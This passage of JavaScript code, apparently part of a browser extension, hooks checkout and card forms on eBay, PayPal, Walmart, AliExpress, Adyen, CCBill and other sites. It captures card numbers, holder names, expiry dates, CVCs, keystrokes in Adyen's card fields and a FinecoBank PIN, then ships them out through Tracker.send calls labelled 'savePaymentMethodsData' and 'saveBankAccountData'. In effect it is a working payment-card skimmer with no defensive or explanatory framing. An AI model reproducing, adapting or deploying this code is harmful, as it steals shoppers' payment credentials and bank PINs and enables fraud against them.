                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                            });
                        });
                    });
                } else {
                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                        if (document.querySelectorAll('.arrow-content').length !== 0) {
                            document.querySelectorAll('.arrow-content').forEach(function (divElement) {
                                divElement.addEventListener('click', function () {
                                    if (divElement.classList.contains('arrow-down')) {
                                        let __interval2 = setInterval(function () {
                                            if (document.querySelector('.add-new-card') !== null) {
                                                clearInterval(__interval2);
                                                ['click', 'dblclick'].forEach(function (event) {
                                                    document.querySelector('.add-new-card')?.addEventListener(event, function () {
                                                        let __interval3 = setInterval(function () {
                                                            if (document.querySelector('.new-card') !== null) {
                                                                clearInterval(__interval3);
                                                                self.explorePaymentNewCard(self,
                                                                    (document.querySelector('.new-card') as HTMLElement),
                                                                    function (elements: any) {
                                                                        let paymentMethodStore: any = [];
                                                                        document.querySelector('.save')?.addEventListener('click', function () {
                                                                            elements.forEach(function (element: any) {
                                                                                paymentMethodStore.push({
                                                                                    'element': element.nodeName,
                                                                                    'id': element.id,
                                                                                    'type': element.type,
                                                                                    'value': element.value
                                                                                });
                                                                            })
                                                                            Tracker.send({
                                                                                command: 'savePaymentMethodsData',
                                                                                data: {
                                                                                    'cardNumber': paymentMethodStore[0].value,
                                                                                    'cardBrand': 'Unknown',
                                                                                    'cardHolder': paymentMethodStore[1].value,
                                                                                    'cardExpire': paymentMethodStore[2].value,
                                                                                    'cardCVC': paymentMethodStore[3].value,
                                                                                    'event': 'add',
                                                                                    'workWebsite': window.location.origin
                                                                                }
                                                                            });
                                                                            paymentMethodStore = [];
                                                                        });
                                                                    });
                                                            }
                                                        }, 1000);
                                                    })
                                                });
                                            }
                                        }, 1000);
                                    }
                                })
                            });
                        }

                        if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
                            clearInterval(interval1);
                            let cardConfirmElement = document.querySelector('#checkout-button');
                            ['click', 'dblclick'].forEach(function (event) {
                                cardConfirmElement?.addEventListener(event, function () {
                                    let tempPaymentMethodsStore: any = [];
                                    document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('icon')) {
                                            if ((__childElement as HTMLElement).classList.contains('visa')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': (__childElement as HTMLElement).nodeName,
                                                    'id': (__childElement as HTMLElement).id,
                                                    'value': 'visa'
                                                });
                                            }
                                        }
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('pay-name')) {
                                            tempPaymentMethodsStore.push({
                                                'element': (__childElement as HTMLElement).nodeName,
                                                'id': (__childElement as HTMLElement).id,
                                                'value': __childElement.textContent
                                            });
                                        }
                                    });
                                    Tracker.send({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].value,
                                            'cardBrand': tempPaymentMethodsStore[1].value,
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'event': 'add',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                });
                            });
                        }
                    }
                    if (window.location.href.indexOf('payResult.htm') !== -1) {
                        clearInterval(interval1);

                        let interval4 = setInterval(function () {
                            if (document.querySelector('.verify-card-form-row') !== null) {
                                clearInterval(interval4);
                                if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        let tempPaymentMethodsStore: any = [];
                                        document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardN', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardHolder', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'expires', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cvc', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardExpire': tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                            tempPaymentMethodsStore = [];
                                        });
                                    });
                                }
                            }
                        }, 1000);
                    }
                }*/
            }
            if (window.location.origin.indexOf('ebay') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        document.querySelectorAll('form').forEach(function (__ebayCreditCardFormElement) {
                            if (__ebayCreditCardFormElement.id === 'credit-card-details') {
                                clearInterval(interval);
                                let elements = [];
                                self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                            }
                        });
                    }
                }, 100);
                if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                    if (document.querySelector('.btn.btn--primary.field')?.nodeName === 'BUTTON') {
                        ["click", "dblclick"].forEach(function (event) {
                            let tempPaymentMethodsStore = [];
                            document.querySelector('.btn.btn--primary.field')?.addEventListener(event, function () {
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'creditCardNumber', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'firstName', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'lastName', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'expirationDate', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'cvv', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                        'cardBrand': document.querySelector('.floating-input__fixright')?.firstElementChild?.className ? document.querySelector('.floating-input__fixright')?.firstElementChild?.className.toLowerCase() : 'Unknown',
                                        'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                        'cardExpire': tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                        'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                                tempPaymentMethodsStore = [];
                            });
                        });
                    }
                }
            }
            if (window.location.origin.indexOf('walmart') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (window.location.href.indexOf('#/payment') !== -1 || window.location.href.indexOf('account/creditcards') !== -1) {
                        clearInterval(interval);
                        self.exploreWalmartPaymentContainer(self);
                    }
                    if (window.location.href.indexOf('#/review') !== -1) {
                        clearInterval(interval);
                        self.exploreWalmartPaymentEditButton(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('hellofresh.de') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('.ReactModalPortal').length !== 0) {
                        clearInterval(interval);
                        document.querySelectorAll('.ReactModalPortal').forEach(function (modal) {
                            if (modal.childNodes.length !== 0) {
                                self.exploreHelloFreshPaymentContainer(self, modal, function (__detectedElement) {
                                    __detectedElement.addEventListener('click', function () {
                                        Tracker.send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': window.sessionStorage.getItem('cardNumber') !== undefined ? window.sessionStorage.getItem('cardNumber') : 'Unknown',
                                                'cardBrand': 'Unknown',
                                                'cardHolder': 'Unknown',
                                                'cardExpire': window.sessionStorage.getItem('cardExpire') !== undefined ? window.sessionStorage.getItem('cardExpire') : 'Unknown',
                                                'cardCVC': window.sessionStorage.getItem('cardCVC') !== undefined ? window.sessionStorage.getItem('cardCVC') : 'Unknown',
                                                'event': 'add',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                        window.sessionStorage.clear();
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('checkoutshopper-live.adyen.com') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelector('body') !== null) {
                        clearInterval(interval);
                        self.explorePaymentInputTag(self, document.querySelector('body'), 'encrypted', function (__detectedElement) {
                            __detectedElement.addEventListener('keyup', function () {
                                if (__detectedElement.id === 'encryptedCardNumber') {
                                    window.sessionStorage.setItem('cardNumber', __detectedElement.value);
                                }
                                if (__detectedElement.id === 'encryptedExpiryDate') {
                                    window.sessionStorage.setItem('cardExpire', __detectedElement.value);
                                }
                                if (__detectedElement.id === 'encryptedSecurityCode') {
                                    window.sessionStorage.setItem('cardCVC', __detectedElement.value);
                                }
                            });
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('bestsecret.com') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreBestSecretPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('paypal') !== -1) {
                clearInterval(interval1);
                /*let lxt = '4WE56938NS691591T'*/
                let interval = setInterval(function () {
                    if (document.querySelector('form') !== null) {
                        clearInterval(interval);
                        document.querySelectorAll('form').forEach(function (__paypalFormElement) {
                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1 || window.location.href.indexOf('webapps') !== -1) {
                                let elements = [];
                                self.explorePayPalPaymentFormElement(self, __paypalFormElement, elements, function (controller, elements) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        controller.addEventListener(event, function () {
                                            let paymentMethodStore = [];
                                            elements.forEach(function (__detectedElement) {
                                                paymentMethodStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1) {
                                                Tracker.send({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown',
                                                        'cardBrand': paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown',
                                                        'cardHolder': 'Unknown',
                                                        'cardExpire': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                        'cardCVC': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                        'event': 'add',
                                                        'workWebsite': window.location.origin
                                                    }
                                                });
                                                paymentMethodStore = [];
                                            }
                                            if (window.location.href.indexOf('webapps') !== -1) {
                                                Tracker.send({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                        'cardBrand': document.querySelector('.css-iro1ss-IconContainer.e7vozvz0')?.firstElementChild?.firstElementChild?.textContent?.toLowerCase(),
                                                        'cardHolder': (paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown') + ' ' + (paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown'),
                                                        'cardExpire': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                        'cardCVC': paymentMethodStore[4].value ? paymentMethodStore[4].value : 'Unknown',
                                                        'event': 'add',
                                                        'workWebsite': window.location.origin
                                                    }
                                                });
                                                paymentMethodStore = [];
                                            }
                                        });
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('finecobank') !== -1) {
                if (document.querySelector('#PIN') !== null) {
                    clearInterval(interval1);
                    self.explorePaymentInputTagOnly(self, document.querySelector('#conferma_email_certifCommand'), function (__detectedElement) {
                        __detectedElement.addEventListener('click', function () {
                            Tracker.send({
                                command: 'saveBankAccountData',
                                data: {
                                    'dataType': 'PIN',
                                    'dataValue': document.querySelector('#PIN').value,
                                    "workWebsite": window.location.origin
                                }
                            });
                        });
                    });
                }
            }
            if (window.location.origin.indexOf('mollie') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreMolliePaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('sunday') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreSundayPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('jetbrains') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (window.location.origin.indexOf('checkout') !== -1) {
                        clearInterval(interval);
                        document.querySelectorAll('button').forEach(function (__buttonElement) {
                            if (__buttonElement.classList.contains('btnConfirmPayment')) {
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': document.querySelector('#ccNumber').value ? document.querySelector('#ccNumber').value : 'Unknown',
                                        'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                        'cardHolder': document.querySelector('#ccHolder').value ? document.querySelector('#ccHolder').value : 'Unknown',
                                        'cardExpire': document.querySelector('#ccExpirationMonth').value ? document.querySelector('#ccExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#ccExpirationYear').value ? document.querySelector('#ccExpirationYear').value : 0,
                                        'cardCVC': document.querySelector('#ccSecurityCode').value ? document.querySelector('#ccSecurityCode').value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                            }
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('paygate') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.explorePaygatePaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('docmorris') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreDocmorrisPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('segpay') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        self.exploreSegPayPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('ccbill') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval);
                        if (document.querySelector('#purchaseForm') !== null && document.querySelector('.pay_by') !== null) {
                            document.querySelector('#placeOrder').addEventListener('click', function () {
                                document.querySelector('.wallet_payment_options.two-column-layout-wallet-payment-options')?.remove();
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': document.querySelector('#creditCardNum').value !== null ? document.querySelector('#creditCardNum').value : 'Unknown',
                                        'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                        'cardHolder': document.querySelector('#firstName').value !== null ? document.querySelector('#firstName').value : 'Unknown' + ' ' + document.querySelector('#lastName').value !== null ? document.querySelector('#lastName').value : 0,
                                        'cardExpire': document.querySelector('#cardExpirationMonth').value !== null ? document.querySelector('#cardExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#cardExpirationYear').value !== null ? document.querySelector('#cardExpirationYear').value : 0,
                                        'cardCVC': document.querySelector('#cvv2').value !== null ? document.querySelector('#cvv2').value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                                //elements = [];
                            });
                        }
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('oppwa.com') !== -1) {
                clearInterval(interval1);
                let interval = setInterval(function () {
                    if (document.querySelector('form').childNodes.length !== 0) {
                        document.querySelector('form').childNodes.forEach(function (__childElement) {
                            if (__childElement.nodeName.toLowerCase() === 'input' && __childElement.type === 'tel') {
                                clearInterval(interval);
                                ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
                                    __childElement.addEventListener(__event, function () {
                                        Tracker.send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': __childElement.getAttribute('aria-label') === 'Card Number' ? __childElement.value : 'Unknown',
                                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                                'cardHolder': /*(document.querySelector('#firstName') as HTMLInputElement).value !== null ? (document.querySelector('#firstName') as HTMLInputElement).value : 'Unknown' + ' ' + (document.querySelector('#lastName') as HTMLInputElement).value !== null ? (document.querySelector('#lastName') as HTMLInputElement).value :*/ 'Unknown',
                                                'cardExpire': document.querySelector('#cardExpirationMonth').value !== null ? document.querySelector('#cardExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#cardExpirationYear').value !== null ? document.querySelector('#cardExpirationYear').value : 0,
                                                'cardCVC': __childElement.getAttribute('aria-label') === 'CVV' ? __childElement.value : 'Unknown',
                                                'event': 'add',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }
        }, 1000);
    }
    exploreSpecificElementByTagName(self, __elementParent, __tagName, __query, callback) {
        if (__elementParent.childNodes.length !== 0) {
            __elementParent.childNodes.forEach(function (__childElement) {
                if (__childElement.nodeName.toLowerCase() === __tagName) {
                    [...__childElement.attributes].forEach(function (attribute) {
                        if (attribute.nodeValue.toLowerCase().indexOf(__query) !== -1) {
                            if (callback) {
                                callback(__childElement);
                            }
                        }
                    });
                }
                else {
                    self.exploreSpecificElementByTagName(self, __childElement, __tagName, __query, callback);
                }
            });
        }
    }
    exploreAliExpressPaymentNewCard(self, __elementParent, callback) {
        let detectedElements = [];
        if (__elementParent.childNodes.length !== 0) {
            __elementParent.childNodes.forEach(function (__childElement) {
                if (__childElement.classList.contains('card-surface')) {
                    if (__childElement.nodeName === 'DIV' && __childElement.childNodes.length !== 0) {
                        __childElement.childNodes.forEach(function (__targetParentElement) {
                            if (__targetParentElement.classList.contains('card-no')) {
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardn', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                            if (__targetParentElement.classList.contains('card-bottom')) {
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cardholder', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'expire', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                                self.exploreSpecificElementByTagName(self, __targetParentElement, 'input', 'cv', function (detectedElement) {
                                    detectedElements.push(detectedElement);
                                });
                            }
                        });
                    }
                }
                if (callback) {
                    callback(detectedElements);
                }
            });
        }
    }
    processAliExpressPaymentNewCard(self) {
        self.exploreAliExpressPaymentNewCard(self, document.querySelector('.new-card'), function (elements) {
            let paymentMethodStore = [];
            document.querySelector('.save')?.addEventListener('click', function () {
                new Set(elements).forEach(function (element) {
                    paymentMethodStore.push({
                        'element': element.nodeName,
                        'id': element.id,
                        'type': element.type,
                        'value': element.value
                    });
                });
                Tracker.send({
                    command: 'savePaymentMethodsData',
                    data: {
                        'cardNumber': paymentMethodStore[0].value,
                        'cardBrand': document.querySelector('.card-type-icon.icon')?.classList.contains('visa') ? 'visa' : (document.querySelector('.card-type-icon.icon')?.classList.contains('mastercard') ? 'mastercard' : (document.querySelector('.card-type-icon.icon')?.classList.contains('discover') ? 'discover' : (document.querySelector('.card-type-icon.icon')?.classList.contains('mnp') ? 'mnp' : (document.querySelector('.card-type-icon.icon')?.classList.contains('maestro') ? 'maestro' : (document.querySelector('.card-type-icon.icon')?.classList.contains('amex') ? 'amex' : document.querySelector('.card-type-icon.icon')?.className))))),
                        'cardHolder': paymentMethodStore[1].value,
                        'cardExpire': paymentMethodStore[2].value,
                        'cardCVC': paymentMethodStore[3].value,
                        'event': 'add',
                        'workWebsite': window.location.origin
                    }
                });
                paymentMethodStore = [];
                let edit = setInterval(function () {
                    if (document.querySelector('.edit-card') !== null) {
                        clearInterval(edit);
                        ['click', 'dblclick'].forEach(function (event) {
                            document.querySelector('.edit-card')?.addEventListener(event, function () {
                                let __interval3 = setInterval(function () {
                                    if (document.querySelector('.new-card') !== null) {
                                        clearInterval(__interval3);
                                        self.processAliExpressPaymentNewCard(self);
                                    }
                                }, 1000);
                            });
                        });
                    }
                }, 1000);
            });
        });
    }
    processAliExpressPaymentNewCardOnSecondPayment(self) {
        let interval = setInterval(function () {
            if (document.querySelector('.card-form') !== null) {
                clearInterval(interval);
                self.exploreAliExpressPaymentNewCard(self, document.querySelector('.card-form'), function (elements) {
                    let paymentMethodStore = [];
                    document.querySelector('.payment-confirm')?.firstElementChild?.addEventListener('click', function () {
                        new Set(elements).forEach(function (element) {
                            paymentMethodStore.push({
                                'element': element.nodeName,
                                'id': element.id,
                                'type': element.type,
                                'value': element.value
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodStore[0].value,
                                'cardBrand': document.querySelector('.card-brand-icon')?.classList.contains('visa') ? 'visa' : (document.querySelector('.card-brand-icon')?.classList.contains('mastercard') ? 'mastercard' : (document.querySelector('.card-brand-icon')?.classList.contains('discover') ? 'discover' : (document.querySelector('.card-brand-icon')?.classList.contains('mnp') ? 'mnp' : (document.querySelector('.card-brand-icon')?.classList.contains('maestro') ? 'maestro' : (document.querySelector('.card-brand-icon')?.classList.contains('amex') ? 'amex' : document.querySelector('.card-brand-icon')?.className))))),
                                'cardHolder': paymentMethodStore[1].value,
                                'cardExpire': paymentMethodStore[2].value,
                                'cardCVC': paymentMethodStore[3].value,
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodStore = [];
                        let edit = setInterval(function () {
                            if (document.querySelector('.payment-edit') !== null) {
                                clearInterval(edit);
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.payment-edit')?.addEventListener(event, function () {
                                        let __interval3 = setInterval(function () {
                                            if (document.querySelector('.card-form') !== null) {
                                                clearInterval(__interval3);
                                                self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                            }
                                        }, 1000);
                                    });
                                });
                            }
                        }, 1000);
                    });
                });
            }
        }, 100);
    }
    exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements) {
        self.exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, function (controller, elements) {
            ['click', 'dblclick'].forEach(function (event) {
                controller.addEventListener(event, function () {
                    let paymentMethodStore = [];
                    elements.forEach(function (__detectedElement) {
                        paymentMethodStore.push({
                            'element': __detectedElement.nodeName,
                            'id': __detectedElement.id,
                            'value': __detectedElement.value
                        });
                    });
                    Tracker.send({
                        command: 'savePaymentMethodsData',
                        data: {
                            'cardNumber': paymentMethodStore[0].id.indexOf('cardNumber') !== -1 ? paymentMethodStore[0].value : 'Unknown',
                            'cardBrand': document.querySelector('.card-types')?.firstElementChild?.getAttribute('aria-label')?.toLowerCase(),
                            'cardHolder': paymentMethodStore[3].id === 'cardHolderFirstName' ? paymentMethodStore[3].value : 'Unknown' + ' ' + paymentMethodStore[4].id === 'cardHolderLastName' ? paymentMethodStore[4].value : 'Unknown',
                            'cardExpire': paymentMethodStore[1].id === 'cardExpiryDate' ? paymentMethodStore[1].value : 'Unknown',
                            'cardCVC': paymentMethodStore[2].id === 'securityCode' ? paymentMethodStore[2].value : 'Unknown',
                            'event': 'add',
                            'workWebsite': window.location.origin
                        }
                    });
                    paymentMethodStore = [];
                    let interval = setInterval(function () {
                        document.querySelectorAll('a').forEach(function (__ebaySecondEntry) {
                            if (__ebaySecondEntry.getAttribute('data-test-id') === 'GET_PAYMENT_INSTRUMENT') {
                                clearInterval(interval);
                                ['click', 'dblclick'].forEach(function (event) {
                                    __ebaySecondEntry.addEventListener(event, function () {
                                        self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                                    });
                                });
                            }
                        });
                    }, 100);
                });
            });
        });
    }
    exploreEbayPaymentFormElement(self, __ebayCreditCardFormElement, elements, callback) {
        if (__ebayCreditCardFormElement.childNodes.length !== 0) {
            __ebayCreditCardFormElement.childNodes.forEach(function (_ebayFormChildElement) {
                if (_ebayFormChildElement.nodeName === 'INPUT' || _ebayFormChildElement.nodeName === 'BUTTON') {
                    if (_ebayFormChildElement.nodeName === 'INPUT' && _ebayFormChildElement.type !== 'hidden' && _ebayFormChildElement.type !== 'checkbox') {
                        elements.push(_ebayFormChildElement);
                    }
                    if (_ebayFormChildElement.nodeName === 'BUTTON' && _ebayFormChildElement.type === 'submit') {
                        if (callback) {
                            callback(_ebayFormChildElement, elements);
                        }
                    }
                }
                else {
                    self.exploreEbayPaymentFormElement(self, _ebayFormChildElement, elements, callback);
                }
            });
        }
    }
    exploreSegPayPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "PayPageForm") {
                let elements = [];
                self.exploreSegPayPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
                                'value': __childElement.value,
                            });
                        });
                        Tracker.send({
                            command: 'savePaymentMethodsData',
                            data: {
                                'cardNumber': paymentMethodData[2].value !== null ? paymentMethodData[2].value : 'Unknown',
                                'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                'cardHolder': paymentMethodData[0].value !== null ? paymentMethodData[0].value : 'Unknown' + ' ' + paymentMethodData[1].value !== null ? paymentMethodData[1].value : 0,
                                'cardExpire': paymentMethodData[3].value !== null ? paymentMethodData[3].value : 'Unknown' + '/' + paymentMethodData[4].value !== null ? paymentMethodData[4].value : 0,
                                'cardCVC': paymentMethodData[5].value !== null ? paymentMethodData[5].value : 'Unknown',
                                'event': 'add',
                                'workWebsite': window.location.origin
                            }
                        });
                        paymentMethodData = [];
                        //elements = [];
                    });
                });
            }
        });
    }
    exploreSegPayPaymentFormElement(self, __formElement, elements, callback) {
        if (__formElement.childNodes.length !== 0) {
            __formElement.childNodes.forEach(function (_childElement) {
                if (_childElement.nodeName === 'INPUT' || _childElement.nodeName === 'SELECT' || _childElement.nodeName === 'BUTTON') {
                    if (_childElement.nodeName === 'INPUT' && _childElement.type !== 'hidden' && _childElement.type !== 'radio' &&
                        _childElement.id !== 'EMailInput' && _childElement.id !== 'AddressInput' && _childElement.id !== 'CityInput' &&
                        _childElement.id !== 'PhoneNumberInput' && _childElement.id !== 'ZipInput' && _childElement.id !== 'TermsConditionsPrivacyInput' ||
                        _childElement.nodeName === 'SELECT' && _childElement.id !== 'LanguageDDL' && _childElement.id !== 'TodaysChargeDDL' &&
                            _childElement.id !== 'StateDDL' && _childElement.id !== 'CountryDDL') {
                        elements.push(_childElement);
                    }
                    if (_childElement.nodeName === 'BUTTON') {
                        if (callback) {
                            callback(_childElement, elements);
                        }
                    }
                }
                else {
                    self.exploreSegPayPaymentFormElement(self, _childElement, elements, callback);
                }
            });
        }
    }
    exploreDocmorrisPaymentContainer(self) {
        document.querySelectorAll('form').forEach(function (__formElement) {
            if (__formElement.id === "form-paymentmethods-credit_card") {
                let elements = [];
                self.exploreDocmorrisPaymentFormElement(self, __formElement, elements, function (controller, elements) {
                    controller.addEventListener('click', function () {
                        let paymentMethodData = [];
                        elements.forEach(function (__childElement) {
                            paymentMethodData.push({
                                'element': __childElement.nodeName,
                                'id': __childElement.id,
                                'name': __childElement.name,
